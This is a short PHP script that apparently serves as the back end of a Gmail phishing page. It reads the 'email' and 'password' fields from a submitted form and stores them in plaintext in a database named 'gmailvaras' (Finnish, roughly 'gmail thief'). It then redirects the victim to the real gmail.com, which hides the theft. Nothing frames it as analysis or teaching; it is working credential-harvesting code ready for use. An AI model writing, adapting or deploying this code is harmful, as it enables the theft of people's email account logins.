<?php
/* Attempt MySQL server connection. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
$link = mysqli_connect("localhost", "root", "salasana", "gmailvaras");

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

// Escape user inputs for security
$email = mysqli_real_escape_string($link, $_POST['email']);
$password = mysqli_real_escape_string($link, $_POST['password']);

// attempt insert query execution
$sql = "INSERT INTO tunnukset (tunnus, salasana) VALUES ('$email', '$password')";
if(mysqli_query($link, $sql)){
  header("Location: http://www.gmail.com");
} else{
    echo "ERROR: Could not able to execute $sql. " . mysqli_error($link);
}

// close connection
mysqli_close($link);
?>
